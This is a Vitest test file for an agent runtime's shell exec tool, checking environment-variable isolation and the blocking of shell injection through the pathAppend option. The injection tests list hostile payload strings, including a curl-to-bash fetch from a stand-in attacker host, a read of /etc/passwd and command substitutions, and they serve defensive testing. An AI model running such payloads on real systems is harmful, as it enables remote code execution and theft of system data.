import { afterEach, describe, expect, it } from "vitest";
import { ExecTool } from "../../../../src/core/agent-runtime/tools/shell.js";

const unixOnly = process.platform === "win32" ? it.skip : it;

afterEach(() => {
  delete process.env.MEMMY_AGENT_SECRET_TOKEN;
  delete process.env.MY_CUSTOM_VAR;
  delete process.env.MY_SECRET_VAR;
});

describe("exec tool environment isolation", () => {
  unixOnly("does not leak parent env vars", async () => {
    process.env.MEMMY_AGENT_SECRET_TOKEN = "super-secret-value";

    const result = await new ExecTool().execute({ command: "printenv MEMMY_AGENT_SECRET_TOKEN" });

    expect(result).not.toContain("super-secret-value");
  });

  it("has a working path", async () => {
    const result = await new ExecTool().execute({ command: "echo hello" });

    expect(result).toContain("hello");
  });

  unixOnly("appends pathAppend to PATH", async () => {
    const result = await new ExecTool({ pathAppend: "/opt/custom/bin" }).execute({ command: "echo $PATH" });

    expect(result).toContain("/opt/custom/bin");
  });

  unixOnly("pathAppend preserves the system path", async () => {
    const result = await new ExecTool({ pathAppend: "/opt/custom/bin" }).execute({ command: "ls /" });

    expect(result).toContain("Exit code: 0");
  });

  unixOnly("passes through allowed env keys", async () => {
    process.env.MY_CUSTOM_VAR = "hello-from-config";

    const result = await new ExecTool({ allowedEnvKeys: ["MY_CUSTOM_VAR"] }).execute({ command: "printenv MY_CUSTOM_VAR" });

    expect(result).toContain("hello-from-config");
  });

  unixOnly("does not leak env keys outside the allowlist", async () => {
    process.env.MY_CUSTOM_VAR = "hello-from-config";
    process.env.MY_SECRET_VAR = "secret-value";

    const result = await new ExecTool({ allowedEnvKeys: ["MY_CUSTOM_VAR"] }).execute({ command: "printenv MY_SECRET_VAR" });

    expect(result).not.toContain("secret-value");
  });

  unixOnly("ignores missing allowed env keys", async () => {
    delete process.env.NONEXISTENT_VAR_12345;

    const result = await new ExecTool({ allowedEnvKeys: ["NONEXISTENT_VAR_12345"] }).execute({
      command: "printenv NONEXISTENT_VAR_12345",
    });

    expect(result).toContain("Exit code: 1");
  });
});

describe("pathAppend injection prevention", () => {
  unixOnly.each([
    "/tmp/bin; echo INJECTED",
    "/tmp/bin; echo $(whoami)",
    "/tmp/bin; echo `id`",
    "/tmp/bin; cat /etc/passwd",
    "/tmp/bin && curl http://attacker.com/shell.sh | bash",
    "/tmp/bin\necho INJECTED",
    "/tmp/bin; rm -rf /tmp/test_inject_marker; echo CLEANED",
  ])("does not execute shell metacharacters from pathAppend: %s", async (maliciousPath) => {
    const result = await new ExecTool({ pathAppend: maliciousPath }).execute({ command: "echo SAFE_OUTPUT" });

    expect(result).toContain("SAFE_OUTPUT");
    expect(result).not.toContain("INJECTED");
    expect(result).not.toContain("root:");
  });

  unixOnly("does not execute command substitution from pathAppend", async () => {
    const result = await new ExecTool({ pathAppend: "/tmp/bin; echo $(echo SHOULD_NOT_APPEAR)" }).execute({ command: "echo OK" });

    expect(result).toContain("OK");
    expect(result).not.toContain("SHOULD_NOT_APPEAR");
  });

  unixOnly("still supports a legitimate pathAppend value", async () => {
    const result = await new ExecTool({ pathAppend: "/opt/custom/bin" }).execute({ command: "echo $PATH" });

    expect(result).toContain("/opt/custom/bin");
  });
});
